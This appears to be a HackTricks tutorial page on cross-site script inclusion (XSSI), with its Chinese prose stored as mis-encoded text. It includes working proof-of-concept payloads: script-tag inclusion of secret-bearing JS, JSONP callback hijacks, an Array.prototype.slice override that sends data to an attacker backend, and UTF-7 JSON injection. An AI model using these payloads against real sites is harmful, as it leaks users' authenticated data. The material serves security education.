# XSSI (è·¨ç«™è„šæœ¬åŒ…å«)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

#### ä¿¡æ¯å–è‡ª [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)

## åŸºæœ¬ä¿¡æ¯

XSSI æŒ‡çš„æ˜¯ä¸€ç§æ¼æ´ï¼Œå®ƒåˆ©ç”¨äº†è¿™æ ·ä¸€ä¸ªäº‹å®ï¼šå½“ä½¿ç”¨ `script` æ ‡ç­¾åŒ…å«èµ„æºæ—¶ï¼ŒSOPï¼ˆåŒæºç­–ç•¥ï¼‰ä¸é€‚ç”¨ï¼Œå› ä¸ºè„šæœ¬å¿…é¡»èƒ½å¤Ÿè·¨åŸŸåŒ…å«ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥**è¯»å–**ä½¿ç”¨ **`script` æ ‡ç­¾**åŒ…å«çš„æ‰€æœ‰å†…å®¹ã€‚

å½“æ¶‰åŠåˆ°åŠ¨æ€ JavaScript æˆ– JSONP æ—¶ï¼Œè¿™ä¸€ç‚¹å°¤å…¶æœ‰è¶£ï¼Œå› ä¸ºæ‰€è°“çš„ç¯å¢ƒæƒé™ä¿¡æ¯ï¼ˆå¦‚ cookiesï¼‰ç”¨äºè®¤è¯ã€‚è¯·æ±‚æ¥è‡ªä¸åŒä¸»æœºçš„èµ„æºæ—¶ï¼Œä¼šåŒ…å« cookiesã€‚

### ç±»å‹

1. é™æ€ JavaScriptï¼ˆå¸¸è§„ XSSIï¼‰
2. åªæœ‰åœ¨è®¤è¯åæ‰èƒ½è®¿é—®çš„é™æ€ JavaScript
3. åŠ¨æ€ JavaScript
4. é JavaScript

## å¸¸è§„ XSSI

ç§æœ‰ä¿¡æ¯ä½äºå…¨å±€å¯è®¿é—®çš„ JS æ–‡ä»¶ä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡é˜…è¯»æ–‡ä»¶ã€æœç´¢å…³é”®è¯æˆ–ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥æ£€æµ‹è¿™ä¸€ç‚¹ã€‚\
è¦åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œåªéœ€åœ¨æ¶æ„å†…å®¹ä¸­åŒ…å«å¸¦æœ‰ç§æœ‰ä¿¡æ¯çš„è„šæœ¬ï¼š
```markup
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
## åŠ¨æ€JavaScriptåŸºç¡€çš„XSSIå’Œè®¤è¯JavaScript-XSSI

**å½“ç”¨æˆ·è¯·æ±‚è„šæœ¬æ—¶ï¼Œä¼šæ·»åŠ æœºå¯†ä¿¡æ¯**ã€‚é€šè¿‡**å¸¦æœ‰å’Œä¸å¸¦æœ‰cookies**å‘é€è¯·æ±‚å¯ä»¥å¾ˆå®¹æ˜“åœ°å‘ç°è¿™ä¸€ç‚¹ï¼Œå¦‚æœæ£€ç´¢åˆ°**ä¸åŒçš„ä¿¡æ¯**ï¼Œåˆ™å¯èƒ½åŒ…å«æœºå¯†ä¿¡æ¯ã€‚è¦è‡ªåŠ¨æ‰§è¡Œæ­¤æ“ä½œï¼Œæ‚¨å¯ä»¥ä½¿ç”¨burpæ‰©å±•ï¼š[https://github.com/luh2/DetectDynamicJS](https://github.com/luh2/DetectDynamicJS)ã€‚

å¦‚æœä¿¡æ¯å­˜åœ¨äºå…¨å±€å˜é‡ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸å‰ä¸€ç§æƒ…å†µç›¸åŒçš„ä»£ç æ¥åˆ©ç”¨å®ƒã€‚\
å¦‚æœæœºå¯†æ•°æ®åœ¨JSONPå“åº”ä¸­å‘é€ï¼Œæ‚¨å¯ä»¥è¦†ç›–æ‰§è¡Œçš„å‡½æ•°ä»¥æ£€ç´¢ä¿¡æ¯ï¼š
```markup
<script>
//The confidential info will be inside the callback to angular.callbacks._7: angular.callbacks._7({"status":STATUS,"body":{"demographics":{"email":......}}})
var angular = function () { return 1; };
angular.callbacks = function () { return 1; };
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```
æˆ–è€…ï¼Œæ‚¨ä¹Ÿå¯ä»¥è®¾ç½®ä¸€ä¸ªé¢„å…ˆå‡†å¤‡å¥½çš„å‡½æ•°ï¼Œç”±JSONPå“åº”æ‰§è¡Œï¼š
```markup
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
å¦‚æœä¸€ä¸ªå˜é‡ä¸åœ¨å…¨å±€å‘½åç©ºé—´å†…ï¼Œæœ‰æ—¶å€™ä»ç„¶å¯ä»¥é€šè¿‡_åŸå‹ç¯¡æ”¹_æ¥åˆ©ç”¨å®ƒã€‚åŸå‹ç¯¡æ”¹æ»¥ç”¨äº†JavaScriptçš„è®¾è®¡ï¼Œå³åœ¨è§£é‡Šä»£ç æ—¶ï¼ŒJavaScriptä¼šéå†åŸå‹é“¾æ¥æŸ¥æ‰¾è¢«è°ƒç”¨çš„å±æ€§ã€‚ä»¥ä¸‹ç¤ºä¾‹æ‘˜è‡ªè®ºæ–‡[The Unexpected Dangers of Dynamic JavaScript](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf)ï¼Œå±•ç¤ºäº†å¦‚ä½•é€šè¿‡é‡å†™`Array`ç±»å‹çš„ç›¸å…³å‡½æ•°å¹¶è®¿é—®`this`ï¼Œä¸€ä¸ªéå…¨å±€å˜é‡ä¹Ÿå¯ä»¥è¢«æ³„éœ²ã€‚
```javascript
(function(){
var arr = ["secret1", "secret2", "secret3"];
// intents to slice out first entry
var x = arr.slice(1);
...
})();
```
åœ¨åŸå§‹ä»£ç ä¸­ï¼Œç±»å‹ä¸º `Array` çš„ `slice` è®¿é—®æˆ‘ä»¬æ„Ÿå…´è¶£çš„æ•°æ®ã€‚æ­£å¦‚å‰æ–‡æ‰€è¿°ï¼Œæ”»å‡»è€…å¯ä»¥é‡å†™ `slice` å¹¶çªƒå–æœºå¯†ã€‚
```javascript
Array.prototype.slice = function(){
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this);
};
```
å®‰å…¨ç ”ç©¶å‘˜ [Sebastian Lekies](https://twitter.com/slekies) æœ€è¿‘æ›´æ–°äº†ä»–çš„ [å‘é‡](http://sebastian-lekies.de/leak/) åˆ—è¡¨ã€‚

## éè„šæœ¬-XSSI

Takeshi Terada åœ¨ä»–çš„è®ºæ–‡ [åŸºäºæ ‡è¯†ç¬¦çš„XSSIæ”»å‡»](https://www.mbsd.jp/Whitepaper/xssi.pdf) ä¸­æè¿°äº†å¦ä¸€ç§XSSIã€‚ä»–èƒ½å¤Ÿé€šè¿‡åœ¨ `script` æ ‡ç­¾ä¸­åŒ…å«CSVæ–‡ä»¶ç­‰éè„šæœ¬æ–‡ä»¶ä½œä¸ºæºï¼Œä½¿ç”¨æ•°æ®ä½œä¸ºå˜é‡å’Œå‡½æ•°åï¼Œä»è€Œè·¨æºæ³„éœ²éè„šæœ¬æ–‡ä»¶ã€‚

ç¬¬ä¸€ä¸ªå…¬å¼€è®°å½•çš„XSSIæ”»å‡»å‘ç”Ÿåœ¨2006å¹´ã€‚Jeremiah Grossmançš„åšå®¢æ–‡ç«  [ä½¿ç”¨GMailçš„é«˜çº§Webæ”»å‡»æŠ€æœ¯](http://jeremiahgrossman.blogspot.ch/2006/01/advanced-web-attack-techniques-using.html) æè¿°äº†ä¸€ä¸ªXSSIï¼Œé€šè¿‡è¦†ç›– `Array` æ„é€ å‡½æ•°ï¼Œèƒ½å¤Ÿè¯»å–è°·æ­Œè´¦æˆ·çš„å®Œæ•´é€šè®¯å½•ã€‚

2007å¹´ï¼ŒJoe Walkerå‘è¡¨äº† [äººä»¬è®¤ä¸ºJSONæ¯”å®é™…å®‰å…¨](http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-it-is/)ã€‚ä»–ä½¿ç”¨ç›¸åŒçš„æ€è·¯æ¥çªƒå–åŒ…å«åœ¨ `Array` ä¸­çš„JSONã€‚

å…¶ä»–ç›¸å…³æ”»å‡»æ˜¯é€šè¿‡å°†UTF-7ç¼–ç å†…å®¹æ³¨å…¥JSONæ¥é€ƒé¿JSONæ ¼å¼ã€‚è¿™ç”± [Hackvertor](https://hackvertor.co.uk/public) çš„ä½œè€…Gareth Heyesåœ¨2011å¹´å‘å¸ƒçš„åšå®¢æ–‡ç«  [JSONåŠ«æŒ](http://www.thespanner.co.uk/2011/05/30/json-hijacking/) ä¸­æè¿°ã€‚åœ¨å¿«é€Ÿæµ‹è¯•ä¸­ï¼Œè¿™åœ¨Microsoft Internet Explorerå’ŒEdgeä¸­ä»ç„¶å¯è¡Œï¼Œä½†åœ¨Mozilla Firefoxæˆ–Google Chromeä¸­ä¸è¡Œã€‚

å¸¦æœ‰UTF-7çš„JSONï¼š
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```
å°† JSON åŒ…å«åœ¨æ”»å‡»è€…çš„é¡µé¢ä¸­
```markup
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´è‡³æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
